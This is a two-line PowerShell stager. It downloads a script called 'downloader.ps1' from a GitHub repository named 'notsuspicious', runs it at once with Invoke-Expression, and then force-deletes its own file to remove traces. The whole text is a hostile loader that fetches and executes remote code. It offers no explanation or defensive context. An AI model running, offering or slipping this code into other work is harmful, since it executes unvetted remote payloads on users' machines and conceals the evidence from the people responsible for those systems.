Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content
Remove-Item $PSCommandPath -Force 